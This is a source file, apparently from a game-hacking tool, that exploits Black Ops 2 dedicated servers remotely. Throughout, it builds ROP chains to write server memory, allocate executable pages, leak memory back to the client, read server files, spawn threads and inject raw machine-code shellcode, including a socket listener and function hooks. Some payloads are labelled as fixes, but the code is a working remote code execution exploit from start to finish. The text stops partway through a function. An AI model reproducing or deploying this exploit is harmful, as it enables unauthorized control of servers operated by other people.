#include "main.h"

SessionData* g_serverSession = (SessionData*)0x026C2BC8;

opd_s CG_GetClientNum_s = { 0x0006D0A8, TOC };
int(*CG_GetClientNum)(int localClientNum) = (int(*)(int))&CG_GetClientNum_s;

opd_s G_GetWeaponIndexForName_s = { 0x2A6A48, TOC };
int(*G_GetWeaponIndexForName)(int* outBuffer, char* weaponName) = (int(*)(int*, char*))&G_GetWeaponIndexForName_s;

opd_s Cbuf_AddText_s = { 0x00313C18, TOC }; //bo2
void(*Cbuf_AddText)(int LocalClient, char* cmd) = (void(*)(int, char*))&Cbuf_AddText_s;


int GetWeaponIndex(char* name)
{
	int WeaponID = 0;
	G_GetWeaponIndexForName(&WeaponID, name);
	return WeaponID;
}

/*
0x009DBBF4                 add     eax, ebx pop     ebx

0x009E6C22                 call    eax add esp, 0x10
0x009C9631                 call    ecx add esp, 0x10
0x00642F58                 call    ecx add esp, 0xC
0x009DD73B                 call    eax add esp, 0xC
0x009E7814                 call    ecx add esp, 0x8
0x0073265F                 call    eax ret
0x00510448                 call    eax add esp, 8

0x00424164				   mov     [eax], ebx  pop ebx
0x00412D2D                 mov     eax, [eax+0Ch]
0x005469FB                 mov     eax, [eax]
0x004D37A0                 mov     dword_F9F2EC, eax

0x0040D5CD                 pop     edi
0x0040232B                 pop     ebx
0x009621C3                 pop     eax
0x00401CE4                 pop     ecx
0x009DD740                 pop     esi
0x00960247                 pop     edx
0x00664BFC				   Com_Error
*/

void RCE_WriteUInt32(unsigned int Address, unsigned int Value)
{
	unsigned char data[4] = { 0 };
	*(int*)(data) = LittleLong(Value);
	RCE_Memcpy(Address, data, 4);
}

void RCE_WriteUInt16(unsigned int Address, unsigned short Value)
{
	unsigned char data[2] = { 0 };
	*(unsigned short*)(data) = LittleShort(Value);
	RCE_Memcpy(Address, data, 2);
}

void RCE_WriteUInt8(unsigned int Address, unsigned char Value)
{
	unsigned char data[1] = { 0 };
	data[0] = Value;
	RCE_Memcpy(Address, data, 1);
}

void RCE_WriteFloat(unsigned int Address, float Value)
{
	if (!g_serverSession->staticData.isDedicated) return;

	float tmpLocal = Value;
	int tempFloat = *(int*)(&tmpLocal);

	ROP Chain;
	Chain.SetUpChain();
	Chain.Push(0x006911CF - 0xC00);
	Chain.Push(tempFloat);
	Chain.Push(Address - 0x34);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0x00423ACA - 0xC00);
	Chain.Push(0x006911D0 - 0xC00);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();

}

void RCE_WriteString(int Address, const char* string)
{
	if (!g_serverSession->staticData.isDedicated) return;

	for (int i = 0; i < 4; i++)
		RCE_Memcpy(Address, (unsigned char*)string, strlen(string) + 1);
}

void RCE_Cbuf_AddText(char* Command)
{
	if (!g_serverSession->staticData.isDedicated) return;


	RCE_WriteString(0x00F9F350, Command);

	ROP Chain;
	Chain.SetUpChain();
	Chain.Push(0x009621C3 - 0xC00);
	Chain.Push(0x00F9F350);
	Chain.Push(0x005BB75E - 0xC00);
	Chain.Push(0x006911D2 - 0xC00);
	Chain.Push(0);
	Chain.Push(0x006911CF - 0xC00);

	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();

}

void RCE_SV_GameSendServerCommand(int ClientNumber, char* Command)
{
	if (!g_serverSession->staticData.isDedicated) return;


	RCE_WriteString(0x00F9F350, Command);

	ROP Chain;
	Chain.SetUpChain();
	Chain.Push(0x0040D5DF - 0xC00);
	Chain.Push(ClientNumber);
	Chain.Push(0x00F9F350);
	Chain.Push(0x0062D3CA - 0xC00);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0x006911D1 - 0xC00);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();

}

void RCE_VirtualAlloc(int Size)
{
	if (!g_serverSession->staticData.isDedicated) return;

	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(0xa2811c);					//VirtualAlloc Import Pointer
	Chain.Push(0x005469FB - 0xC00);			//mov     eax, [eax]
	Chain.Push(0x0073265F - 0xC00);			//call    eax ret
	Chain.Push(0);							//addr
	Chain.Push(0x1000);						//size
	Chain.Push(MEM_COMMIT | MEM_RESERVE);	//addr
	Chain.Push(PAGE_EXECUTE_READWRITE);		//permissions
	Chain.Push(0x004D37A0 - 0xC00);			//mov     dword_F9F2EC, eax
	Chain.Push(0x006911D3 - 0xC00);			//ret
	Chain.Push(0x00666498 - 0xC00);


	Chain.ExecuteChain();
	Chain.ClearChain();
}

void RCE_SentToClient(int ClientNumber, int Address, int Lenght)
{
	if (!g_serverSession->staticData.isDedicated) return;


	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(ClientNumber);				//length

	Chain.Push(0x00401CE4 - 0xC00);			//pop ecx
	Chain.Push(0x00694F40 - 0xC00);			//SendToClient

	Chain.Push(0x009E7814 - 0xC00);			//call    ecx add esp, 0x8
	Chain.Push(Address);					//address
	Chain.Push(Lenght);						//Lenght

	Chain.Push(0x006911D1 - 0xC00);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();
}

void RCE_CallFunctionAtPointer(int Pointer)
{
	if (!g_serverSession->staticData.isDedicated) return;


	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(Pointer);					//Pointer
	Chain.Push(0x005469FB - 0xC00);			//mov eax, [eax]
	Chain.Push(0x0073265F - 0xC00);			//call eax
	Chain.Push(0x00732661 - 0xC00);			//ret

	Chain.Push(0x006911CF - 0xC00);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0);

	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();
}

void RCE_WriteToPointer(int Pointer, int Offset, int Value)
{
	if (!g_serverSession->staticData.isDedicated) return;


	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(Pointer);					//Pointer
	Chain.Push(0x005469FB - 0xC00);			//mov eax, [eax]
	Chain.Push(0x0040232B - 0xC00);			//pop ebx
	Chain.Push(Offset);						//Offset
	Chain.Push(0x009DBBF4 - 0xC00);			//add eax, ebx
	Chain.Push(Value);						//Value
	Chain.Push(0x00424164 - 0xC00);			//add eax, ebx
	Chain.Push(0);
	Chain.Push(0x006911D3 - 0xC00);
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();
}

void RCE_CallFunctionAtPointerWithParams(int Pointer, int p1, int p2)
{
	if (!g_serverSession->staticData.isDedicated) return;


	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(Pointer);					//Pointer
	Chain.Push(0x005469FB - 0xC00);			//mov eax, [eax]
	Chain.Push(0x00510448 - 0xC00);			//call eax
	Chain.Push(p1);
	Chain.Push(p2);
	Chain.Push(0x006911D0 - 0xC00);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0);
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();
}

void RCE_CreateThreadAtAddress(int Address)
{
	if (!g_serverSession->staticData.isDedicated) return;


	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(0x00A280F8);					//Pointer
	Chain.Push(0x005469FB - 0xC00);			//mov eax, [eax]
	Chain.Push(0x0073265F - 0xC00);			//call eax
	Chain.Push(0);//lpThreadAttributes
	Chain.Push(0x10000);//dwStackSize
	Chain.Push(Address);//lpStartAddress
	Chain.Push(0);//lpParameter
	Chain.Push(0);//dwCreationFlags
	Chain.Push(0);//lpThreadId 0x18
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();
}

void G_GivePlayerWeapon(int playerstate, int weapon)
{
	if (!g_serverSession->staticData.isDedicated) return;

	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x009621C3 - 0xC00);			//pop eax
	Chain.Push(playerstate);				//ps
	Chain.Push(0x00401CE4 - 0xC00);			//pop ecx
	Chain.Push(0x0062CEC0 - 0xC00);			//G_GivePlayerWeapon
	Chain.Push(0x00642F58 - 0xC00);			//call ecx
	Chain.Push(weapon);						//weapon
	Chain.Push(0);							//altModelIndex
	Chain.Push(0);							//weaponOptions
	Chain.Push(0x00642F5D - 0xC00);
	Chain.Push(0x00642F5D - 0xC00);
	Chain.Push(0x00666498 - 0xC00);

	Chain.ExecuteChain();
	Chain.ClearChain();
}

void RCE_Memcpy(int dst, unsigned char* src, int size)
{
	if (!g_serverSession->staticData.isDedicated) return;


	if (size > 0x800)
		return;

	for (int i = 0; i < 4; i++)
	{
		ROP Chain;
		Chain.SetUpChain();

		Chain.Push(0x00a1924b);					//lea eax, [esp + 4]
		Chain.Push(0x00401220);					//pop esi
		Chain.Push(-0x808);						//-0x400
		Chain.Push(0x00602c83);					//add eax, esi
		Chain.Push(0x00644DEE);					//pop esi pop ecx
		Chain.Push(size);						//esi
		Chain.Push(0x0095ED00);					//ecx memcpy 
		Chain.Push(0x0095F647);					//pop edx
		Chain.Push(dst);						//edx
		Chain.Push(0x007E54C7);					//call ecx
		Chain.Push(0);							//padding
		Chain.Push(0x004075CA);					//add esp, 0Ch
		Chain.Push(0);
		Chain.Push(0);
		Chain.Push(0);
		Chain.Push(0x0066589B);

		Chain.ExecuteChain(src, size);
		Chain.ClearChain();
	}
}

void RCE_CopyAndCall(int dst, unsigned char* src, int size)
{
	if (!g_serverSession->staticData.isDedicated) return;


	ROP Chain;
	Chain.SetUpChain();

	Chain.Push(0x00a1924b);					//lea eax, [esp + 4]
	Chain.Push(0x00401220);					//pop esi
	Chain.Push(-0x808);						//-0x400
	Chain.Push(0x00602c83);					//add eax, esi
	Chain.Push(0x00644DEE);					//pop esi pop ecx
	Chain.Push(size);						//esi
	Chain.Push(0x0095ED00);					//ecx memcpy 
	Chain.Push(0x0095F647);					//pop edx
	Chain.Push(dst);						//edx
	Chain.Push(0x007E54C7);					//call ecx
	Chain.Push(0);							//padding
	Chain.Push(0x009615C3);					//pop eax
	Chain.Push(dst);						//Pointer
	Chain.Push(0x00731A5F);					//call eax
	Chain.Push(0x00731A61);					//ret
	Chain.Push(0x0066589B);

	Chain.ExecuteChain(src, size);
	Chain.ClearChain();

}

unsigned char* GetServerMemory(int Address, int Size)
{
	if (!g_serverSession->staticData.isDedicated) return NULL;


	int Client = CG_GetClientNum(0);

	*(int*)(0x10070000) = 0;


	RCE_SentToClient(Client, Address, Size);

	while (*(int*)(0x10070000) == 0)
		Sleep(1);

	return (unsigned char*)0x10070008;
}

int InstallListener()
{
	if (!g_serverSession->staticData.isDedicated) return NULL;
	/*
	push ebp
	mov ebp, esp
	and esp, 0xfffffff0
	sub esp, 0x38
	push esi
	push edi
	mov edi, dword ptr [0x00A28418]

	restart:
	push 0
	xorps xmm0, xmm0
	push 2
	push 2
	movaps xmmword ptr [esp + 0x2c], xmm0
	movaps xmmword ptr [esp + 0x1c], xmm0
	movaps xmmword ptr [esp + 0x3c], xmm0
	call edi
	push 4
	mov esi, eax
	mov dword ptr [esp + 0xc], 1
	lea eax, dword ptr [esp + 0xc]
	push eax
	push 4
	push 0xffff
	push esi
	call dword ptr [0x00A28438]
	mov eax, 2
	mov dword ptr [esp + 0x14], 0
	push 33399
	mov word ptr [esp + 0x14], ax
	call dword ptr [0x00A2840C]
	mov word ptr [esp + 0x12], ax
	lea eax, dword ptr [esp + 0x10]
	push 0x10
	push eax
	push esi
	call dword ptr [0x00A28414]
	lea eax, dword ptr [esp + 0xc]
	mov dword ptr [esp + 0xc], 0x10
	push eax
	lea eax, dword ptr [esp + 0x14]
	push eax
	push 0
	push 0x10
	lea eax, dword ptr [esp + 0x40]
	push eax
	push esi
	call dword ptr [0x00A28400]
	push esi
	call dword ptr [0x00A28448]
	push 0
	push 2
	push 2
	call edi
	mov ecx, dword ptr [esp + 0x38]
	mov esi, eax
	mov eax, 2
	mov dword ptr [esp + 0x24], ecx
	push 0x6174
	mov word ptr [esp + 0x24], ax
	call dword ptr [0x00A2840C]
	push 0x10
	mov word ptr [esp + 0x26], ax
	lea eax, dword ptr [esp + 0x24]
	push eax
	push 0
	push dword ptr [esp + 0x40]
	push dword ptr [esp + 0x40]
	push esi
	call dword ptr [0x00A28410]
	push esi
	call dword ptr [0x00A28448]
	jmp restart
	*/

	unsigned char rawData[244] = {
		0x55, 0x89, 0xE5, 0x83, 0xE4, 0xF0, 0x83, 0xEC, 0x38, 0x56, 0x57, 0x8B,
		0x3D, 0x18, 0x84, 0xA2, 0x00, 0x6A, 0x00, 0x0F, 0x57, 0xC0, 0x6A, 0x02,
		0x6A, 0x02, 0x0F, 0x29, 0x44, 0x24, 0x2C, 0x0F, 0x29, 0x44, 0x24, 0x1C,
		0x0F, 0x29, 0x44, 0x24, 0x3C, 0xFF, 0xD7, 0x6A, 0x04, 0x89, 0xC6, 0xC7,
		0x44, 0x24, 0x0C, 0x01, 0x00, 0x00, 0x00, 0x8D, 0x44, 0x24, 0x0C, 0x50,
		0x6A, 0x04, 0x68, 0xFF, 0xFF, 0x00, 0x00, 0x56, 0xFF, 0x15, 0x38, 0x84,
		0xA2, 0x00, 0xB8, 0x02, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14, 0x00,
		0x00, 0x00, 0x00, 0x68, 0x77, 0x82, 0x00, 0x00, 0x66, 0x89, 0x44, 0x24,
		0x14, 0xFF, 0x15, 0x0C, 0x84, 0xA2, 0x00, 0x66, 0x89, 0x44, 0x24, 0x12,
		0x8D, 0x44, 0x24, 0x10, 0x6A, 0x10, 0x50, 0x56, 0xFF, 0x15, 0x14, 0x84,
		0xA2, 0x00, 0x8D, 0x44, 0x24, 0x0C, 0xC7, 0x44, 0x24, 0x0C, 0x10, 0x00,
		0x00, 0x00, 0x50, 0x8D, 0x44, 0x24, 0x14, 0x50, 0x6A, 0x00, 0x6A, 0x10,
		0x8D, 0x44, 0x24, 0x40, 0x50, 0x56, 0xFF, 0x15, 0x00, 0x84, 0xA2, 0x00,
		0x56, 0xFF, 0x15, 0x48, 0x84, 0xA2, 0x00, 0x6A, 0x00, 0x6A, 0x02, 0x6A,
		0x02, 0xFF, 0xD7, 0x8B, 0x4C, 0x24, 0x38, 0x89, 0xC6, 0xB8, 0x02, 0x00,
		0x00, 0x00, 0x89, 0x4C, 0x24, 0x24, 0x68, 0x74, 0x61, 0x00, 0x00, 0x66,
		0x89, 0x44, 0x24, 0x24, 0xFF, 0x15, 0x0C, 0x84, 0xA2, 0x00, 0x6A, 0x10,
		0x66, 0x89, 0x44, 0x24, 0x26, 0x8D, 0x44, 0x24, 0x24, 0x50, 0x6A, 0x00,
		0xFF, 0x74, 0x24, 0x40, 0xFF, 0x74, 0x24, 0x40, 0x56, 0xFF, 0x15, 0x10,
		0x84, 0xA2, 0x00, 0x56, 0xFF, 0x15, 0x48, 0x84, 0xA2, 0x00, 0xE9, 0x1E,
		0xFF, 0xFF, 0xFF, 0x00
	};

	int retries = 0;

	int Allocated = 0;

	while (LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4)) != 0) {
		RCE_WriteUInt32(0xF9F2EC, 0);
	}

	while ((Allocated = LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4))) == 0) {
		RCE_VirtualAlloc(0x100);
	}

tryAgain:
	RCE_Memcpy(Allocated, rawData, sizeof(rawData));


	unsigned char BufferCheck[244] = { 0 };

	memcpy((void*)BufferCheck, (void*)GetServerMemory(Allocated, 244), 244);

	if (!memcmp(BufferCheck, rawData, 244))
		return Allocated;
	else {
		retries++;

		if (retries > 5)
			return 0;

		goto tryAgain;
	}
}

bool ReadFileToMemory(char* Name, int* Buffer, int* Size)
{
	if (!g_serverSession->staticData.isDedicated) return false;

	/*
	push ebp
	mov ebp, esp
	push ecx
	push ebx
	push esi
	push edi
	push 0
	push 0x80
	push 3
	push 0
	push 1
	push 0x80000000
	push 0xf9f350
	call dword ptr [0x00A280B0]
	mov ebx, eax
	push 0
	push ebx
	call dword ptr [0x00A280B4]
	mov edi, eax
	mov eax, 0x95b0dd
	push edi
	call eax
	add esp, 4
	mov dword ptr [ebp - 4], 0
	mov esi, eax
	lea eax, dword ptr [ebp - 4]
	push 0
	push eax
	push edi
	push esi
	push ebx
	call dword ptr [0x00A280BC]
	mov dword ptr [0x2966dcc], edi
	push ebx
	mov dword ptr [0x2966dc8], esi
	call dword ptr [0x00A280C0]
	pop edi
	pop esi
	pop ebx
	mov esp, ebp
	pop ebp
	ret
	*/

	unsigned char rawData[112] = {
		0x55, 0x89, 0xE5, 0x51, 0x53, 0x56, 0x57, 0x6A, 0x00, 0x68, 0x80, 0x00,
		0x00, 0x00, 0x6A, 0x03, 0x6A, 0x00, 0x6A, 0x01, 0x68, 0x00, 0x00, 0x00,
		0x80, 0x68, 0x50, 0xF3, 0xF9, 0x00, 0xFF, 0x15, 0xB0, 0x80, 0xA2, 0x00,
		0x89, 0xC3, 0x6A, 0x00, 0x53, 0xFF, 0x15, 0xB4, 0x80, 0xA2, 0x00, 0x89,
		0xC7, 0xB8, 0xDD, 0xB0, 0x95, 0x00, 0x57, 0xFF, 0xD0, 0x83, 0xC4, 0x04,
		0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x89, 0xC6, 0x8D, 0x45, 0xFC,
		0x6A, 0x00, 0x50, 0x57, 0x56, 0x53, 0xFF, 0x15, 0xBC, 0x80, 0xA2, 0x00,
		0x89, 0x3D, 0xCC, 0x6D, 0x96, 0x02, 0x53, 0x89, 0x35, 0xC8, 0x6D, 0x96,
		0x02, 0xFF, 0x15, 0xC0, 0x80, 0xA2, 0x00, 0x5F, 0x5E, 0x5B, 0x89, 0xEC,
		0x5D, 0xC3, 0x00, 0x00
	};

	int retries = 0;

	int Allocated = 0;

	while (LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4)) != 0) {
		RCE_WriteUInt32(0xF9F2EC, 0);
	}

	while ((Allocated = LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4))) == 0) {
		RCE_VirtualAlloc(0x100);
	}

tryAgain:

	RCE_Memcpy(Allocated, rawData, sizeof(rawData));

	unsigned char BufferCheck[112] = { 0 };

	memcpy((void*)BufferCheck, (void*)GetServerMemory(Allocated, 112), 112);

	RCE_WriteString(0x00F9F350, Name);


	if (!memcmp(BufferCheck, rawData, 112))
	{
		RCE_CallFunctionAtPointer(0xF9F2EC);

		while ((*Buffer = LittleLong(*(int*)GetServerMemory(0x2966DC8, 0x4))) == 0) { Sleep(1); }
		while ((*Size = LittleLong(*(int*)GetServerMemory(0x2966DCC, 0x4))) == 0) { Sleep(1); }

		return true;
	}

	else {
		retries++;

		if (retries > 5)
			return false;

		goto tryAgain;
	}
}

bool RemoteExecuteCode(unsigned char* function, int Size)
{
	if (!g_serverSession->staticData.isDedicated) return false;

	int Allocated = 0;

	while (LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4)) != 0) {
		RCE_WriteUInt32(0xF9F2EC, 0);
	}

	while ((Allocated = LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4))) == 0) {
		RCE_VirtualAlloc(0x100);
	}

	RCE_CopyAndCall(Allocated, function, Size);

	return false;
}

void PathSlCrash()
{
	if (!g_serverSession->staticData.isDedicated) return;

	unsigned char rawData[144] = { 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x24, 0x33, 0xC0, 0x89, 0x45, 0xDC, 0x89, 0x45, 0xE0, 0x89, 0x45, 0xE4, 0x89, 0x45, 0xE8, 0xC7, 0x45, 0xDC, 0x56, 0x69, 0x72, 0x74, 0xC7, 0x45, 0xE0, 0x75, 0x61, 0x6C, 0x50, 0xC7, 0x45, 0xE4, 0x72, 0x6F, 0x74, 0x65, 0xC7, 0x45, 0xE8, 0x63, 0x74, 0x00, 0x00, 0x8B, 0x0D, 0x38, 0x81, 0xA2, 0x00, 0x89, 0x4D, 0xF8, 0x8B, 0x15, 0xA8, 0x80, 0xA2, 0x00, 0x89, 0x55, 0xF0, 0x68, 0xA8, 0x1F, 0xB1, 0x00, 0xFF, 0x55, 0xF8, 0x89, 0x45, 0xF4, 0x8D, 0x45, 0xDC, 0x50, 0x8B, 0x4D, 0xF4, 0x51, 0xFF, 0x55, 0xF0, 0x89, 0x45, 0xFC, 0x8D, 0x55, 0xEC, 0x52, 0x6A, 0x40, 0x68, 0x00, 0x70, 0x62, 0x00, 0x68, 0x00, 0x10, 0x40, 0x00, 0xFF, 0x55, 0xFC, 0x8D, 0x45, 0xEC, 0x50, 0x6A, 0x40, 0x68, 0x2C, 0x6B, 0x14, 0x00, 0x68, 0xD4, 0x84, 0xA2, 0x00, 0xFF, 0x55, 0xFC, 0xC7, 0x05, 0x10, 0xBE, 0x58, 0x00, 0xC3, 0xC3, 0xC3, 0xC3, 0x8B, 0xE5, 0x5D, 0xC3, 0xCC, };

	int Allocated = 0;

	while (LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4)) != 0) {
		RCE_WriteUInt32(0xF9F2EC, 0);
	}

	while ((Allocated = LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4))) == 0) {
		RCE_VirtualAlloc(0x100);
	}

	RCE_CopyAndCall(Allocated, rawData, sizeof(rawData));
}

bool FixMatch()
{
	/*
	__declspec(naked) void VirtualUnprotect()
{
	__asm {
		pushad

		sub esp, 0x200
		mov  ebp, esp
	}


	char* pointer;

	__asm {
		mov pointer, edi
	}


	if (*(int*)(pointer) == 0x72646E65) {
		*(int*)(pointer) = 0x656E6472;
	}

	if (*(int*)(pointer) == 0x6B636F63) {
		*(int*)(pointer) = 0x72646E65;
	}

	if (*(int*)(pointer) == 0x6C6C696B) {
		*(int*)(pointer) = 0x72646E65;
	}

	__asm
	{

		mov  esp, ebp
		add esp, 0x200
		popad

		push esi
		mov esi, eax

		imul    esi, 0x42A8
		nop
		nop
		nop
		nop
		nop
	}
}*/
	if (!g_serverSession->staticData.isDedicated) return false;

	PathSlCrash();

	int retries = 0;

	int length = 0x5A;


	unsigned char endroundHook[96] = { 0x60, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x8B, 0xEC, 0x89, 0x7D, 0xFC, 0x8B, 0x45, 0xFC, 0x81, 0x38, 0x65, 0x6E, 0x64, 0x72, 0x75, 0x09, 0x8B, 0x4D, 0xFC, 0xC7, 0x01, 0x72, 0x64, 0x6E, 0x65, 0x8B, 0x55, 0xFC, 0x81, 0x3A, 0x63, 0x6F, 0x63, 0x6B, 0x75, 0x09, 0x8B, 0x45, 0xFC, 0xC7, 0x00, 0x65, 0x6E, 0x64, 0x72, 0x8B, 0x4D, 0xFC, 0x81, 0x39, 0x6B, 0x69, 0x6C, 0x6C, 0x75, 0x09, 0x8B, 0x55, 0xFC, 0xC7, 0x02, 0x65, 0x6E, 0x64, 0x72, 0x8B, 0xE5, 0x81, 0xC4, 0x00, 0x02, 0x00, 0x00, 0x61, 0x56, 0x8B, 0xF0, 0x69, 0xF6, 0xA8, 0x42, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0xCC, };

	int Allocated = 0;

	while (LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4)) != 0) {
		RCE_WriteUInt32(0xF9F2EC, 0);
	}

	while ((Allocated = LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4))) == 0) {
		RCE_VirtualAlloc(0x100);
	}

	unsigned char jmp[5] = { 0 };

	jmp[0] = 0xE9;

	int jmpAddress = LittleLong(CalculateRelativeJMPAddress((Allocated + length), 0x0077D569));

	memcpy(jmp + 1, &jmpAddress, 4);
	memcpy(endroundHook + length, jmp, 5);

tryAgain:

	RCE_Memcpy(Allocated, endroundHook, sizeof(endroundHook));

	unsigned char BufferCheck[96] = { 0 };

	memcpy((void*)BufferCheck, (void*)GetServerMemory(Allocated, 96), 96);

	if (!memcmp(BufferCheck, endroundHook, 96))
	{
		int FromGamejmpAddress = LittleLong(CalculateRelativeJMPAddress(0x0077D560, Allocated));
		jmp[0] = 0xE9;
		memcpy(jmp + 1, &FromGamejmpAddress, 4);

		RCE_Memcpy(0x0077D560, jmp, sizeof(jmp));

		return true;
	}
	else {
		retries++;

		if (retries > 5)
			return false;

		goto tryAgain;
	}
}

void RCE_WriteIntToClient(int clientNum, unsigned int address, unsigned int value) {
	int baseAddress = (int)(*(int*)(0x00E22F18)) + 0x68B9C;
	int valueToSend = (address - baseAddress) >> 2;

	char buffer[100] = { 0 };
	sprintf(buffer, "i %i %i", valueToSend, value);

	RCE_SV_GameSendServerCommand(clientNum, buffer);
}


bool FixClientUserinfoChanged()
{
	if (!g_serverSession->staticData.isDedicated) return false;

	PathSlCrash();

	int retries = 0;

	unsigned char rawData[240] = { 0x60, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x8B, 0xEC, 0x89, 0x4D, 0xF8, 0x89, 0x55, 0xF0, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xF8, 0x03, 0x45, 0xF4, 0x0F, 0xBE, 0x08, 0x85, 0xC9, 0x74, 0x0B, 0x8B, 0x55, 0xF4, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xF4, 0xEB, 0xE8, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x45, 0xFC, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xFC, 0x8B, 0x4D, 0xFC, 0x3B, 0x4D, 0xF4, 0x0F, 0x8D, 0x90, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xF8, 0x03, 0x55, 0xFC, 0x0F, 0xBE, 0x02, 0x83, 0xF8, 0x30, 0x7C, 0x0E, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x0F, 0xBE, 0x11, 0x83, 0xFA, 0x39, 0x7E, 0x54, 0x8B, 0x45, 0xF8, 0x03, 0x45, 0xFC, 0x0F, 0xBE, 0x08, 0x83, 0xF9, 0x41, 0x7C, 0x0E, 0x8B, 0x55, 0xF8, 0x03, 0x55, 0xFC, 0x0F, 0xBE, 0x02, 0x83, 0xF8, 0x5A, 0x7E, 0x38, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x0F, 0xBE, 0x11, 0x83, 0xFA, 0x61, 0x7C, 0x0E, 0x8B, 0x45, 0xF8, 0x03, 0x45, 0xFC, 0x0F, 0xBE, 0x08, 0x83, 0xF9, 0x7A, 0x7E, 0x1C, 0x8B, 0x55, 0xF8, 0x03, 0x55, 0xFC, 0x0F, 0xBE, 0x02, 0x83, 0xF8, 0x5F, 0x74, 0x0E, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x0F, 0xBE, 0x11, 0x83, 0xFA, 0x2D, 0x75, 0x12, 0x8B, 0x45, 0xF0, 0x03, 0x45, 0xFC, 0x8B, 0x4D, 0xF8, 0x03, 0x4D, 0xFC, 0x8A, 0x11, 0x88, 0x10, 0xEB, 0x09, 0x8B, 0x45, 0xF0, 0x03, 0x45, 0xFC, 0xC6, 0x00, 0x6F, 0xE9, 0x5B, 0xFF, 0xFF, 0xFF, 0x8B, 0xE5, 0x81, 0xC4, 0x00, 0x02, 0x00, 0x00, 0x61, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, };

	int Allocated = 0;

	while (LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4)) != 0) {
		RCE_WriteUInt32(0xF9F2EC, 0);
	}

	while ((Allocated = LittleLong(*(int*)GetServerMemory(0xF9F2EC, 0x4))) == 0) {
		RCE_VirtualAlloc(0x100);
	}

	unsigned char jmp[5] = { 0 };


tryAgain:

	RCE_Memcpy(Allocated, rawData, sizeof(rawData));

	unsigned char BufferCheck[240] = { 0 };

	memcpy((void*)BufferCheck, (void*)GetServerMemory(Allocated, 240), 240);

	if (!memcmp(BufferCheck, rawData, 240))
	{
		int FromGamejmpAddress = LittleLong(CalculateRelativeJMPAddress(0x00576100, Allocated));
		jmp[0] = 0xE9;
		memcpy(jmp + 1, &FromGamejmpAddress, 4);

		RCE_Memcpy(0x00576100, jmp, sizeof(jmp));

		return true;
	}
	else {
		retries++;

		if (retries > 5)
			return false;

		goto tryAgain;
	}
}

bool FixSV_SanitizeName()
{
	if (!g_serverSession->staticData.isDedicated) return false;

	PathSlCrash();

	int retries = 0;

